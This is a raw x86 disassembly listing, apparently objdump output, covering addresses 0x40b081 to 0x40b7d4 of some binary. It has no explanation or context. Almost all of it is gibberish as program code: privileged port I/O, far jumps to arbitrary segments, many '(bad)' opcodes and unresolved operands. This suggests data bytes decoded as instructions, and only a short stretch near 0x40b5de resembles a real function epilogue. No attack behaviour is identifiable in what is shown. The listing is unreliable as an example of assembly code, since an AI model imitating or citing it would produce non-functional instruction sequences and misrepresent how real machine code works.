  40b081:	test   eax,0x64ca7ace
  40b086:	xor    BYTE PTR [eax+0x3aad0c36],al
  40b08c:	xor    al,0x3
  40b08e:	imul   edx,DWORD PTR [edx],0xffffffd0
  40b091:	fs icebp 
  40b093:	jl     0x40b0dc
  40b095:	arpl   WORD PTR [ecx-0x6d],cx
  40b098:	pop    esp
  40b099:	enter  0xfcbe,0xbd
  40b09d:	add    BYTE PTR [ecx+0x8],0xdb
  40b0a1:	push   cs
  40b0a2:	addr16 getsec 
  40b0a5:	inc    ebp
  40b0a6:	fadd   QWORD PTR [eax]
  40b0a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0a9:	mov    dl,dl
  40b0ab:	push   es
  40b0ac:	loope  0x40b108
  40b0ae:	cmp    eax,0x1f307429
  40b0b3:	les    esi,FWORD PTR [edx-0x751cd700]
  40b0b9:	pop    ss
  40b0ba:	in     al,dx
  40b0bb:	out    dx,eax
  40b0bc:	cwde   
  40b0bd:	pop    ds
  40b0be:	test   eax,0x5439382e
  40b0c3:	scas   eax,DWORD PTR es:[edi]
  40b0c4:	inc    edx
  40b0c5:	rcl    BYTE PTR [ebp-0x19],cl
  40b0c8:	add    ecx,DWORD PTR [eax-0x47]
  40b0cb:	sbb    DWORD PTR [ebx-0x63],esi
  40b0ce:	pop    esi
  40b0cf:	jecxz  0x40b115
  40b0d1:	xchg   ebx,eax
  40b0d2:	jmp    DWORD PTR [edi-0x35]
  40b0d5:	inc    ebx
  40b0d6:	mov    cl,0x9
  40b0d8:	adc    DWORD PTR [eax-0x23],ebx
  40b0db:	xor    BYTE PTR [ebx],al
  40b0dd:	cs jae 0x40b0fa
  40b0e0:	xor    dh,BYTE PTR [edx]
  40b0e2:	cli    
  40b0e3:	ins    BYTE PTR es:[edi],dx
  40b0e4:	adc    BYTE PTR [edi+edi*8-0xe7fe29f],dh
  40b0eb:	test   edi,ecx
  40b0ed:	mov    esi,DWORD PTR ds:0xc4ee69c4
  40b0f3:	push   ss
  40b0f4:	or     edx,DWORD PTR [ebp-0x4d7024d4]
  40b0fa:	cmp    eax,0xa4a171b0
  40b0ff:	pushf  
  40b100:	leave  
  40b101:	and    DWORD PTR [ecx+0x1a],edx
  40b104:	jmp    0x6bcd:0xf063b848
  40b10b:	leave  
  40b10c:	mov    dl,0x4b
  40b10e:	push   edx
  40b10f:	jb     0x40b0ef
  40b111:	jmp    0x1430e992
  40b116:	nop
  40b117:	into   
  40b118:	call   0x3a99c9b4
  40b11d:	inc    eax
  40b11e:	repnz sbb esi,DWORD PTR [edx-0x53]
  40b122:	aam    0xe7
  40b124:	cmp    esp,ebx
  40b126:	mov    eax,ds:0xfb661f30
  40b12b:	sbb    esp,DWORD PTR ds:0x9b634b
  40b131:	xchg   ebx,eax
  40b132:	jno    0x40b120
  40b134:	xor    BYTE PTR [edi+0xc02034],0x13
  40b13b:	mov    DWORD PTR [ebx],0x25c0fbcc
  40b141:	sub    DWORD PTR [esi+0x5a],edi
  40b144:	outs   dx,BYTE PTR ds:[esi]
  40b145:	push   eax
  40b146:	aas    
  40b147:	mov    esi,0x6a4c89e5
  40b14c:	pop    ds
  40b14d:	in     al,dx
  40b14e:	or     ch,BYTE PTR [edx-0x29]
  40b151:	das    
  40b152:	addr16 cmc 
  40b154:	int3   
  40b155:	jb     0x40b19a
  40b157:	es mov bh,0x8b
  40b15a:	push   esi
  40b15b:	jmp    0x480:0x17dcaa72
  40b162:	into   
  40b163:	fs xchg esi,eax
  40b165:	xchg   edi,eax
  40b166:	ret    
  40b167:	jno    0x40b1dc
  40b169:	push   esi
  40b16a:	xchg   ebp,eax
  40b16b:	sbb    DWORD PTR [ebx],esi
  40b16d:	inc    eax
  40b16e:	jb     0x40b1e1
  40b170:	int    0x4f
  40b172:	sbb    BYTE PTR [eax],bl
  40b174:	push   ds
  40b175:	sbb    al,0xd9
  40b177:	sbb    BYTE PTR [ebx-0x36],bh
  40b17a:	sbb    bl,BYTE PTR [ebp+0x179bd764]
  40b180:	bound  ebp,QWORD PTR [ecx]
  40b182:	xchg   esi,eax
  40b183:	sub    edi,DWORD PTR [esi-0x7c054801]
  40b189:	xchg   esi,eax
  40b18a:	or     dh,BYTE PTR [edx+eax*8]
  40b18d:	dec    esp
  40b18e:	add    ah,dh
  40b190:	jae    0x40b201
  40b192:	rcl    DWORD PTR [edx+edx*8],cl
  40b195:	pushf  
  40b196:	shl    DWORD PTR [edx+esi*1],1
  40b199:	xlat   BYTE PTR ds:[ebx]
  40b19a:	pop    esi
  40b19b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b19c:	push   ecx
  40b19d:	push   esp
  40b19e:	ss das 
  40b1a0:	and    eax,0x7645b6e
  40b1a5:	mov    eax,ss:0xbc436ea3
  40b1ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b1ac:	sub    BYTE PTR [edx+0x619700f2],bl
  40b1b2:	daa    
  40b1b3:	pop    edi
  40b1b4:	iret   
  40b1b5:	pop    esi
  40b1b6:	enter  0x12f7,0x8
  40b1ba:	xchg   DWORD PTR [ebp+0x64],edi
  40b1bd:	mov    ds:0x12268ea7,al
  40b1c2:	mov    ss,WORD PTR [ecx]
  40b1c4:	mov    dl,0x3c
  40b1c6:	adc    al,0x4c
  40b1c8:	int    0xd5
  40b1ca:	add    ebx,DWORD PTR [eax-0x52cccd9d]
  40b1d0:	scas   eax,DWORD PTR es:[edi]
  40b1d1:	add    esp,edi
  40b1d3:	mov    ds:0x50bfe000,al
  40b1d8:	fldenv [edi-0x5e]
  40b1db:	sbb    eax,0x48d8fb55
  40b1e0:	xchg   esp,eax
  40b1e1:	popa   
  40b1e2:	cmp    al,0xaa
  40b1e4:	sub    al,0x65
  40b1e6:	int    0x45
  40b1e8:	xchg   esp,eax
  40b1e9:	pop    ebx
  40b1ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1eb:	adc    DWORD PTR [eax+0x8d86372],ebp
  40b1f1:	fild   QWORD PTR [eax+0x47d0dbb9]
  40b1f7:	loop   0x40b221
  40b1f9:	les    esp,FWORD PTR [ebp+0x6b]
  40b1fc:	jne    0x40b191
  40b1fe:	adc    dl,ah
  40b200:	push   eax
  40b201:	mov    ?,WORD PTR [ebx+0xdbf7aee]
  40b207:	jge    0x40b252
  40b209:	cdq    
  40b20a:	scas   al,BYTE PTR es:[edi]
  40b20b:	(bad)
  40b20f:	xchg   ecx,esp
  40b211:	lea    edi,[ebx]
  40b213:	imul   edi,DWORD PTR [ebx+edx*8],0xffffffd5
  40b217:	cmp    bh,dh
  40b219:	sbb    DWORD PTR [esi-0x3d296d55],eax
  40b21f:	push   ds
  40b220:	dec    ebx
  40b221:	je     0x40b291
  40b223:	loopne 0x40b1a6
  40b225:	ss push es
  40b227:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b228:	mov    ecx,0x831c803f
  40b22d:	popf   
  40b22e:	xchg   edx,eax
  40b22f:	ins    DWORD PTR es:[edi],dx
  40b230:	nop
  40b231:	jbe    0x40b241
  40b233:	cmp    dh,dl
  40b235:	pusha  
  40b236:	sar    BYTE PTR [ebx-0x5f71b246],0xdf
  40b23d:	jle    0x40b215
  40b23f:	call   0xf72e:0xd701dd40
  40b246:	push   edx
  40b247:	lock push ebx
  40b249:	adc    eax,0xc5a7e5d
  40b24e:	jae    0x40b204
  40b250:	xchg   ecx,eax
  40b251:	mov    cl,0xf
  40b253:	xor    BYTE PTR [ebp+0x2b],ah
  40b256:	stos   BYTE PTR es:[edi],al
  40b257:	sub    esi,edx
  40b259:	lods   eax,DWORD PTR cs:[esi]
  40b25b:	pop    ds
  40b25c:	pop    ebx
  40b25d:	call   0xc3f0:0x20fef980
  40b264:	gs iret 
  40b266:	stc    
  40b267:	cdq    
  40b268:	jno    0x40b2dd
  40b26a:	out    dx,al
  40b26b:	jbe    0x40b270
  40b26d:	cdq    
  40b26e:	sub    DWORD PTR [edi],edi
  40b270:	stc    
  40b271:	xchg   ebp,eax
  40b272:	ss iret 
  40b274:	jle    0x40b26d
  40b276:	ss hlt 
  40b278:	mov    cl,0x1f
  40b27a:	rcl    BYTE PTR [ecx],1
  40b27c:	cmp    al,0xc5
  40b27e:	jg     0x40b28b
  40b280:	je     0x40b27d
  40b282:	jno    0x40b2be
  40b284:	clc    
  40b285:	je     0x40b2e7
  40b287:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b288:	push   cs
  40b289:	ss arpl ax,bp
  40b28c:	ret    0xc29a
  40b28f:	dec    ebp
  40b290:	in     eax,0xe1
  40b292:	mov    al,ds:0x610e326b
  40b297:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b298:	pop    ebp
  40b299:	inc    edx
  40b29a:	in     al,dx
  40b29b:	std    
  40b29c:	pop    edx
  40b29d:	pop    DWORD PTR [ebx+0x48983a00]
  40b2a3:	stos   DWORD PTR es:[edi],eax
  40b2a4:	cmp    DWORD PTR [ecx+eiz*4-0x3aeca826],edi
  40b2ab:	popa   
  40b2ac:	retf   0x7f95
  40b2af:	fnsave [edx]
  40b2b1:	inc    BYTE PTR [eax-0x13]
  40b2b4:	add    eax,0x2c74db5b
  40b2b9:	ds cmp eax,0x82927a76
  40b2bf:	jmp    0x40b5d8
  40b2c4:	rol    al,cl
  40b2c6:	(bad)  
  40b2c7:	leave  
  40b2c8:	fcmove st,st(1)
  40b2ca:	rcl    edi,1
  40b2cc:	pop    ss
  40b2cd:	mov    ecx,0xe08db132
  40b2d2:	mov    ?,ecx
  40b2d4:	into   
  40b2d5:	mov    bh,BYTE PTR [eax+0x78]
  40b2d8:	je     0x40b358
  40b2da:	js     0x40b354
  40b2dc:	fcomp  QWORD PTR [ecx-0x1e88f31a]
  40b2e2:	test   BYTE PTR [edx-0x5c495b4],dh
  40b2e8:	add    al,0x0
  40b2ea:	cs fwait
  40b2ec:	call   0xdf82de82
  40b2f1:	mov    cl,0xcf
  40b2f3:	lahf   
  40b2f4:	xchg   ebp,eax
  40b2f5:	sub    al,0x3
  40b2f7:	in     eax,dx
  40b2f8:	or     DWORD PTR [ebx+0x35],ebx
  40b2fb:	imul   esi,DWORD PTR [edx-0x74cd5b67],0xfffffff9
  40b302:	in     al,dx
  40b303:	arpl   WORD PTR [ebp-0x5c],di
  40b306:	pop    ecx
  40b307:	rcr    DWORD PTR [edi-0x3ac0436f],0x34
  40b30e:	cwde   
  40b30f:	inc    esi
  40b310:	adc    DWORD PTR [ecx+edi*8+0x5f],esi
  40b314:	jne    0x40b2d8
  40b316:	mov    fs,WORD PTR [ecx-0x1ad37b41]
  40b31c:	fs inc ebx
  40b31e:	fbstp  TBYTE PTR [ecx-0x58]
  40b321:	sub    eax,0xbec286ed
  40b326:	mov    ebp,0xbb727829
  40b32b:	pop    esp
  40b32c:	xor    al,BYTE PTR [eax-0x6b]
  40b32f:	shl    edi,cl
  40b331:	pusha  
  40b332:	cdq    
  40b333:	aam    0x2f
  40b335:	fimul  WORD PTR [esi+0x74]
  40b338:	inc    eax
  40b339:	jle    0x40b3b6
  40b33b:	sbb    eax,0x7be9a178
  40b340:	mov    bl,0x27
  40b342:	retf   
  40b343:	sar    BYTE PTR [eax*2-0x2d46fb6f],cl
  40b34a:	xchg   ebx,eax
  40b34b:	mov    ?,ebx
  40b34d:	ss stc 
  40b34f:	xchg   esi,eax
  40b350:	mov    ds:0xce1cdd96,al
  40b355:	cli    
  40b356:	and    al,0xe
  40b358:	or     edx,DWORD PTR [edx]
  40b35a:	sub    ah,al
  40b35c:	cmp    dh,ch
  40b35e:	dec    ebp
  40b35f:	pop    esi
  40b360:	inc    esi
  40b361:	jae    0x40b33f
  40b363:	ret    
  40b364:	pushf  
  40b365:	(bad)  gs:[eax]
  40b368:	lods   al,BYTE PTR ds:[esi]
  40b369:	ins    BYTE PTR es:[edi],dx
  40b36a:	out    dx,eax
  40b36b:	pop    edx
  40b36c:	cmp    bl,cl
  40b36e:	retf   0x5f22
  40b371:	jo     0x40b3a9
  40b373:	imul   ecx,ecx,0x421fc75a
  40b379:	test   BYTE PTR [esi+0x5],dh
  40b37c:	test   BYTE PTR [eax],bl
  40b37e:	les    esp,FWORD PTR [ebx]
  40b380:	jnp    0x40b3f2
  40b382:	dec    esp
  40b383:	push   edi
  40b384:	hlt    
  40b385:	inc    esp
  40b386:	xchg   edi,eax
  40b387:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b388:	xor    al,0xd1
  40b38a:	outs   dx,DWORD PTR ds:[esi]
  40b38b:	sbb    al,0xd8
  40b38d:	cmp    ch,al
  40b38f:	enter  0xa942,0xe5
  40b393:	cli    
  40b394:	ins    DWORD PTR es:[edi],dx
  40b395:	std    
  40b396:	pop    es
  40b397:	mov    ah,0x1a
  40b399:	cs popa 
  40b39b:	add    BYTE PTR [edi+0x4a],al
  40b39e:	mov    dl,0x45
  40b3a0:	stos   BYTE PTR es:[edi],al
  40b3a1:	xor    al,BYTE PTR [esi-0x4]
  40b3a4:	add    eax,0x2602f30b
  40b3a9:	mov    ecx,0x19d99aae
  40b3ae:	mov    al,BYTE PTR [ebx]
  40b3b0:	mov    eax,ds:0x3b761d44
  40b3b5:	mov    ?,edx
  40b3b7:	cmp    edx,DWORD PTR [ebx-0x11c33154]
  40b3bd:	mov    eax,ds:0x7ed604a9
  40b3c2:	outs   dx,BYTE PTR ds:[esi]
  40b3c3:	iret   
  40b3c4:	(bad)  
  40b3c5:	cmc    
  40b3c6:	cmp    BYTE PTR [ebx+0x1e],bl
  40b3c9:	ins    DWORD PTR es:[edi],dx
  40b3ca:	in     eax,0x31
  40b3cc:	mov    eax,0xd34d71a5
  40b3d1:	dec    ecx
  40b3d2:	or     ch,BYTE PTR [ecx]
  40b3d4:	add    BYTE PTR [ebp-0x36a5df4],bl
  40b3da:	pop    edi
  40b3db:	ja     0x40b42c
  40b3dd:	pushf  
  40b3de:	repnz pusha 
  40b3e0:	fadd   st(4),st
  40b3e2:	cli    
  40b3e3:	push   edi
  40b3e4:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40b3e6:	cmp    edx,esp
  40b3e8:	sub    edi,0xffffffc7
  40b3eb:	ret    0xfa31
  40b3ee:	xor    al,0xe
  40b3f0:	xchg   dl,bl
  40b3f2:	inc    ecx
  40b3f3:	loop   0x40b416
  40b3f5:	mov    ah,0x10
  40b3f7:	inc    ebp
  40b3f8:	in     eax,0xb
  40b3fa:	or     DWORD PTR [edx],edi
  40b3fc:	clc    
  40b3fd:	iret   
  40b3fe:	mov    ah,0x9
  40b400:	xor    DWORD PTR [edi-0x192d0f64],esi
  40b406:	ss cmp al,0x54
  40b409:	adc    cl,BYTE PTR [edi]
  40b40b:	daa    
  40b40c:	mov    ebx,0x32ef2531
  40b411:	loopne 0x40b39f
  40b413:	add    BYTE PTR [ecx],cl
  40b415:	ins    BYTE PTR es:[edi],dx
  40b416:	sti    
  40b417:	pop    ds
  40b418:	(bad)  
  40b419:	std    
  40b41a:	outs   dx,DWORD PTR ds:[esi]
  40b41b:	xor    DWORD PTR [ebx-0x654040e7],0x40
  40b422:	push   ebp
  40b423:	gs loop 0x40b41b
  40b426:	neg    DWORD PTR [esi-0x6bfc3e3e]
  40b42c:	rol    esp,cl
  40b42e:	jns    0x40b3f3
  40b430:	inc    eax
  40b431:	jecxz  0x40b4a4
  40b433:	ja     0x40b412
  40b435:	xor    ebx,DWORD PTR [eax+0xf]
  40b438:	add    DWORD PTR [ebp+0x40423171],eax
  40b43e:	xchg   edx,eax
  40b43f:	pop    ds
  40b440:	idiv   DWORD PTR [edi-0x1bad7f1]
  40b446:	push   es
  40b447:	pop    eax
  40b448:	add    bh,cl
  40b44a:	das    
  40b44b:	cs test al,0x2e
  40b44e:	sbb    DWORD PTR [ecx],esi
  40b450:	cmp    al,0xb5
  40b452:	sub    eax,0x9d3a89f0
  40b457:	aaa    
  40b458:	les    ecx,FWORD PTR [esi-0x3b]
  40b45b:	dec    ebx
  40b45c:	xchg   ebx,eax
  40b45d:	retf   0xb79
  40b460:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b461:	(bad)  
  40b462:	fst    DWORD PTR [edi-0x65ed9b04]
  40b468:	mov    eax,0x6637acc3
  40b46d:	pop    ecx
  40b46e:	mov    ebp,0x96b9d847
  40b473:	mov    ds:0x365313e8,al
  40b478:	inc    esi
  40b479:	push   ss
  40b47a:	sub    esp,DWORD PTR [esi+0x46705545]
  40b480:	push   ebx
  40b481:	fistp  QWORD PTR [esi+0x7f23bc89]
  40b487:	and    BYTE PTR [eax],cl
  40b489:	test   DWORD PTR [eax],ebp
  40b48b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b48c:	sub    DWORD PTR [ecx-0x71],ecx
  40b48f:	xor    DWORD PTR [ebx+0x40],edi
  40b492:	or     al,0x82
  40b494:	and    DWORD PTR [eax],0x5d
  40b497:	jecxz  0x40b4f9
  40b499:	addr16 mov ch,0xb0
  40b49c:	es inc esp
  40b49e:	mov    cl,0x86
  40b4a0:	std    
  40b4a1:	scas   eax,DWORD PTR es:[edi]
  40b4a2:	call   0x90cd:0x7e6a3f04
  40b4a9:	mov    al,0x6c
  40b4ab:	into   
  40b4ac:	shl    DWORD PTR [edi+0x7a],0x57
  40b4b0:	pop    ebx
  40b4b1:	dec    edx
  40b4b2:	mov    ds:0xfb2ed3e8,eax
  40b4b7:	xchg   DWORD PTR [edx+0x1b],ebp
  40b4ba:	sbb    DWORD PTR [esi],esp
  40b4bc:	push   cs
  40b4bd:	sahf   
  40b4be:	jae    0x40b494
  40b4c0:	pusha  
  40b4c1:	add    edi,eax
  40b4c3:	dec    esi
  40b4c4:	adc    ecx,ecx
  40b4c6:	sub    eax,0xd13b182c
  40b4cb:	repnz in al,0x4c
  40b4ce:	retf   0x4e99
  40b4d1:	repz fsub DWORD PTR [edi-0x5d]
  40b4d5:	clc    
  40b4d6:	xchg   esi,eax
  40b4d7:	pop    sp
  40b4d9:	jne    0x40b50e
  40b4db:	repz add dl,BYTE PTR ds:0xbe7b4d6b
  40b4e2:	not    DWORD PTR [edi+edi*2-0x3b46803e]
  40b4e9:	push   ebp
  40b4ea:	es sbb eax,0x1bf608d5
  40b4f0:	lods   eax,DWORD PTR ds:[esi]
  40b4f1:	div    DWORD PTR [ebp-0x3a]
  40b4f4:	hlt    
  40b4f5:	stos   BYTE PTR es:[edi],al
  40b4f6:	mov    ecx,0xeb47bbdd
  40b4fb:	sub    esi,DWORD PTR [edx-0x4de80bab]
  40b501:	dec    ebx
  40b502:	lods   eax,DWORD PTR ds:[esi]
  40b503:	sbb    DWORD PTR [edx],esi
  40b505:	mov    ebp,0xa93c69fb
  40b50a:	imul   edi,DWORD PTR [edx+ebx*2+0x1f],0xf232c3ba
  40b512:	add    edx,DWORD PTR [ecx+0x51bf0a52]
  40b518:	pusha  
  40b519:	stc    
  40b51a:	mov    dh,BYTE PTR [edi+0x15]
  40b51d:	adc    edx,DWORD PTR [ebx+0x6a4d9ca3]
  40b523:	ret    
  40b524:	xor    edx,DWORD PTR [eax]
  40b526:	jb     0x40b4fb
  40b528:	fucomip st,st(5)
  40b52a:	push   DWORD PTR [eax-0x9]
  40b52d:	add    BYTE PTR [ecx+0x3],dl
  40b530:	fild   QWORD PTR [ecx]
  40b532:	inc    esi
  40b533:	ror    BYTE PTR [ebp-0x80],1
  40b536:	or     BYTE PTR [esi],0x46
  40b539:	xchg   esp,eax
  40b53a:	add    bh,ch
  40b53c:	out    0xa,al
  40b53e:	(bad)  
  40b53f:	sbb    esp,edx
  40b541:	lds    edx,FWORD PTR [ebx-0x3603d69d]
  40b547:	repz std 
  40b549:	sbb    BYTE PTR [edx+0xdc5ca46],al
  40b54f:	scas   al,BYTE PTR es:[edi]
  40b550:	fiadd  WORD PTR [edi-0x300fd009]
  40b556:	push   esp
  40b557:	sub    dh,dh
  40b559:	jle    0x40b505
  40b55b:	dec    ebp
  40b55c:	fidivr WORD PTR [esi-0x69c75872]
  40b562:	jp     0x40b5ad
  40b564:	mov    bl,0x33
  40b566:	js     0x40b543
  40b568:	rol    eax,cl
  40b56a:	inc    ebp
  40b56b:	(bad)  
  40b56c:	loope  0x40b5ab
  40b56e:	push   es
  40b56f:	xchg   al,cl
  40b571:	mov    ch,0xa5
  40b573:	adc    BYTE PTR [edi-0x2b],0x7e
  40b577:	test   al,0x67
  40b579:	sub    edx,DWORD PTR [edx]
  40b57b:	pusha  
  40b57c:	and    cl,BYTE PTR [esi+0x22]
  40b57f:	mov    esp,0xe2b05fdd
  40b584:	(bad)  
  40b585:	xor    esi,esi
  40b587:	in     eax,0x52
  40b589:	pop    es
  40b58a:	adc    eax,0x95f3b62c
  40b58f:	and    BYTE PTR [ecx-0x4f49ed63],dh
  40b595:	xchg   ebp,eax
  40b596:	out    dx,al
  40b597:	(bad)  
  40b598:	(bad)  
  40b599:	mov    edi,0x55ffe18b
  40b59e:	outs   dx,DWORD PTR ds:[esi]
  40b59f:	jg     0x40b5ef
  40b5a1:	xor    eax,0xdb265c9c
  40b5a6:	inc    dx
  40b5a8:	adc    DWORD PTR [edx-0x4e],0xb08de5ec
  40b5af:	xchg   ecx,eax
  40b5b0:	jp     0x40b557
  40b5b2:	icebp  
  40b5b3:	stos   DWORD PTR es:[edi],eax
  40b5b4:	fimul  DWORD PTR [ecx-0x26]
  40b5b7:	in     al,dx
  40b5b8:	sbb    al,0xc1
  40b5ba:	lea    ebx,[edi+0x1d]
  40b5bd:	cmp    al,0x7
  40b5bf:	(bad)  
  40b5c0:	aam    0x88
  40b5c2:	neg    BYTE PTR [ebx-0x39]
  40b5c5:	dec    eax
  40b5c6:	nop
  40b5c7:	mov    cl,0xb1
  40b5c9:	push   cs
  40b5ca:	int3   
  40b5cb:	mov    ecx,0xc2726aa5
  40b5d0:	sbb    esi,DWORD PTR cs:[ebx-0x65]
  40b5d4:	lahf   
  40b5d5:	dec    ebp
  40b5d6:	mov    bh,0xce
  40b5d8:	je     0x40b5f5
  40b5de:	mov    eax,DWORD PTR [ebp-0x1c]
  40b5e1:	or     DWORD PTR [eax],0x60751c9d
  40b5e7:	mov    eax,DWORD PTR [ebp-0x8]
  40b5ea:	xor    eax,ecx
  40b5ec:	add    eax,esi
  40b5ee:	pop    edi
  40b5ef:	pop    esi
  40b5f0:	pop    ebx
  40b5f1:	leave  
  40b5f2:	ret    0x4
  40b5f5:	mov    eax,DWORD PTR [ebp-0xc]
  40b5f8:	add    eax,DWORD PTR [ebp-0x18]
  40b5fb:	jmp    0x40b914
  40b600:	leave  
  40b601:	xlat   BYTE PTR ds:[ebx]
  40b602:	ret    
  40b603:	rcl    cl,0xd4
  40b606:	leave  
  40b607:	fldcw  WORD PTR [esi-0x20332a7c]
  40b60d:	jp     0x40b60f
  40b60f:	mov    esp,0x78788fca
  40b614:	je     0x40b694
  40b616:	js     0x40b690
  40b618:	mov    cl,BYTE PTR [esi-0x29]
  40b61b:	test   eax,0xfd789286
  40b620:	das    
  40b621:	fld    QWORD PTR ds:0x4a83d2c1
  40b627:	aas    
  40b628:	and    al,0x45
  40b62a:	mov    cl,0xaf
  40b62c:	mov    bh,0xb4
  40b62e:	loopne 0x40b5fa
  40b630:	fs pop ecx
  40b632:	mov    esi,0x38ace713
  40b637:	xchg   edx,eax
  40b638:	xor    DWORD PTR [ebp+0x7a15d82e],ebp
  40b63e:	inc    edx
  40b63f:	test   eax,0xc08960ea
  40b644:	inc    esi
  40b645:	adc    dl,dh
  40b647:	adc    esp,DWORD PTR [ebx+0x38b38ce7]
  40b64d:	or     al,0xaf
  40b64f:	in     eax,dx
  40b650:	jae    0x40b667
  40b652:	in     al,dx
  40b653:	pop    ss
  40b654:	adc    dl,BYTE PTR [ebx+0x29641f4a]
  40b65a:	mov    al,ds:0xab001f37
  40b65f:	pop    ds
  40b660:	jmp    0xfbab0149
  40b665:	mov    bl,0xce
  40b667:	jle    0x40b688
  40b669:	add    BYTE PTR [eax+0x47],bh
  40b66c:	cmp    al,0x2f
  40b66e:	inc    esp
  40b66f:	mov    eax,fs
  40b671:	fnstsw ax
  40b673:	mov    edx,0x3e4992f
  40b678:	fisubr WORD PTR [edx+0x469a58ae]
  40b67e:	and    BYTE PTR [edi+0x66],ch
  40b681:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b682:	ja     0x40b69f
  40b684:	xchg   ebx,eax
  40b685:	lahf   
  40b686:	sub    esi,DWORD PTR [eax+0x152b8d]
  40b68c:	mov    ecx,DWORD PTR [edx+edx*8+0x503ff282]
  40b693:	jns    0x40b6c1
  40b695:	and    dh,BYTE PTR [ecx-0x5a]
  40b698:	jno    0x40b6a6
  40b69a:	fild   QWORD PTR [edi]
  40b69c:	or     esp,DWORD PTR [edi]
  40b69e:	sub    BYTE PTR [ebx],cl
  40b6a0:	or     dh,BYTE PTR [esi+ebp*1-0x6a]
  40b6a4:	js     0x40b713
  40b6a6:	add    al,0x2
  40b6a8:	iret   
  40b6a9:	adc    BYTE PTR [ebx-0x7c],ah
  40b6ac:	sti    
  40b6ad:	pop    edi
  40b6ae:	mov    eax,DWORD PTR [ebx+0x33]
  40b6b1:	dec    edx
  40b6b2:	lea    ecx,[edx-0x278438fa]
  40b6b8:	(bad)  
  40b6b9:	lock jecxz 0x40b734
  40b6bc:	in     al,0x29
  40b6be:	(bad)  
  40b6bf:	rcl    BYTE PTR [ecx],1
  40b6c1:	aam    0xa8
  40b6c3:	(bad)  
  40b6c4:	(bad)  
  40b6c5:	out    0x38,al
  40b6c7:	shr    BYTE PTR [ecx-0x7812a654],0xc3
  40b6ce:	sub    al,0xd0
  40b6d0:	push   edi
  40b6d1:	jl     0x40b6cd
  40b6d3:	mov    ecx,0xd6929f28
  40b6d8:	data16 sti 
  40b6da:	push   0xffffff97
  40b6dc:	push   0x6aa9796d
  40b6e1:	adc    BYTE PTR [ecx+0xe005434],ch
  40b6e7:	repz lahf 
  40b6e9:	push   edi
  40b6ea:	fwait
  40b6eb:	rcr    DWORD PTR [ebx+0xbc64e5d],cl
  40b6f1:	out    dx,al
  40b6f2:	cmp    ebp,eax
  40b6f4:	je     0x40b732
  40b6f6:	xchg   edx,eax
  40b6f7:	sbb    edi,DWORD PTR [eax-0x5e91c625]
  40b6fd:	cmp    al,0xeb
  40b6ff:	pop    ss
  40b700:	add    BYTE PTR [ebp-0x47b9af88],0x38
  40b707:	psubsw mm7,QWORD PTR [ecx-0x1a35ede2]
  40b70e:	sub    esi,DWORD PTR ds:[ecx+0x3963a3ab]
  40b715:	sbb    eax,DWORD PTR [eax]
  40b717:	out    dx,eax
  40b718:	mov    edi,0x7259e6b7
  40b71d:	popa   
  40b71e:	es pop ds
  40b720:	pop    edi
  40b721:	addr16 daa 
  40b723:	mov    bh,0xa0
  40b725:	inc    edi
  40b726:	imul   edx,DWORD PTR [ebx],0x24
  40b729:	inc    edx
  40b72a:	sbb    eax,DWORD PTR [ecx-0x539079c7]
  40b730:	cs int3 
  40b732:	pop    edx
  40b733:	sub    eax,0x3245362b
  40b738:	xlat   BYTE PTR ds:[ebx]
  40b739:	popf   
  40b73a:	mov    al,ds:0xc0896304
  40b73f:	jl     0x40b778
  40b741:	xlat   BYTE PTR gs:[bx]
  40b744:	popf   
  40b745:	xchg   ebx,eax
  40b746:	sti    
  40b747:	arpl   WORD PTR [ebx],cx
  40b749:	push   eax
  40b74a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b74b:	jne    0x40b6d4
  40b74d:	dec    ebx
  40b74e:	dec    esp
  40b74f:	xchg   ecx,eax
  40b750:	xchg   ebp,eax
  40b752:	xor    al,0x6f
  40b755:	sahf   
  40b756:	and    DWORD PTR [edi-0x1c],esp
  40b759:	pop    esp
  40b75a:	fs addr16 or eax,0x957da1f0
  40b761:	dec    edi
  40b762:	push   ebx
  40b763:	out    0xe5,eax
  40b765:	mov    edi,0xe7ad02ac
  40b76a:	add    bh,cl
  40b76c:	and    al,0xe1
  40b76e:	lahf   
  40b76f:	mov    al,ds:0x37473448
  40b774:	loopne 0x40b701
  40b776:	add    al,0xdd
  40b778:	jecxz  0x40b769
  40b77a:	(bad)  
  40b77b:	and    dh,dl
  40b77d:	inc    edx
  40b77e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b77f:	in     al,dx
  40b780:	mov    dh,0x5e
  40b782:	jecxz  0x40b7cb
  40b784:	jmp    0xf2f5:0xb5b2d227
  40b78b:	ror    BYTE PTR [edi+0x40934551],1
  40b791:	ret    
  40b792:	pop    esp
  40b793:	into   
  40b794:	push   0xffffff9b
  40b796:	push   edx
  40b797:	pushf  
  40b798:	dec    ebp
  40b799:	out    dx,eax
  40b79a:	jmp    0x1d08:0x8696a479
  40b7a1:	add    al,0x5c
  40b7a3:	cmc    
  40b7a4:	bound  esi,QWORD PTR [ecx-0x5a]
  40b7a7:	(bad)  
  40b7a9:	out    0x91,eax
  40b7ab:	(bad)  
  40b7ac:	jae    0x40b7ec
  40b7ae:	stos   DWORD PTR es:[edi],eax
  40b7af:	popf   
  40b7b0:	add    dl,bh
  40b7b2:	mov    esp,0xe4e596a1
  40b7b7:	push   edi
  40b7b8:	das    
  40b7b9:	out    0x23,eax
  40b7bb:	stos   BYTE PTR es:[edi],al
  40b7bc:	(bad)  
  40b7bd:	pop    esp
  40b7be:	enter  0x9986,0x8d
  40b7c2:	test   BYTE PTR [ebx],al
  40b7c4:	cmp    eax,0xf3ffbf74
  40b7c9:	push   esp
  40b7ca:	sbb    esi,DWORD PTR [edi-0x4ea10b84]
  40b7d0:	add    al,0xc8
  40b7d2:	mov    dh,0xb1
  40b7d4:	dec    edx
